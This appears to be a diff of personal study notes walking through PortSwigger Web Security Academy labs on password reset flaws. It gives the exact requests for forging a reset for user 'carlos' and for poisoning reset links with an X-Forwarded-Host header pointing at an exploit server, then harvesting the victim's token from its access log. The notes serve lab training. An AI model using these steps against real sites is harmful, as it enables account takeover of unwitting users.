@@ -537,15 +537,14 @@ Update: python sqlmap.py --update
       - POST /forgot-password?temp-forgot-password-token=
       - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
 25. Password reset poisoning via **middleware**
+    - When the victim requests a password reset, the reset link sent to the victim's email will point to the attacker's domain (the X-Forwarded-Host), allowing the attacker to capture the password reset token when the victim clicks the link  
     - Perform password reset    
       Password reset url in email: https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?temp-forgot-password-token=5e8pujqdepap1aow7n5jiahx9ncik0wd   
     - Send to repeater and **perform password reset as victim user**   
       POST /forgot-password   
-      add in header: `X-Forwarded-Host: exploit-0afc000003da9d43819b60d201bb0007.exploit-server.net`   
-    - Change in below and submit   
-      POST /forgot-password?temp-forgot-password-token=temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456   
-      Response: please check your email for a reset password link   
-    - Exploit server access log   
+      add in header: `X-Forwarded-Host: exploit-0afc000003da9d43819b60d201bb0007.exploit-server.net`
+      change username to carlos  
+    - Read server access log  
       10.0.3.157      2024-07-10 15:00:32 +0000 "GET /forgot-password?temp-forgot-password-token=**ofunlh8j6vngx003vnifub7hywv4ppw1**   
     - replace old token with new one and access the password reset url (change carlos password)   
       https://0ade00ee03fb9d7081d461a700980052.web-security-academy.net/forgot-password?**temp-forgot-password-token=ofunlh8j6vngx003vnifub7hywv4ppw1**   
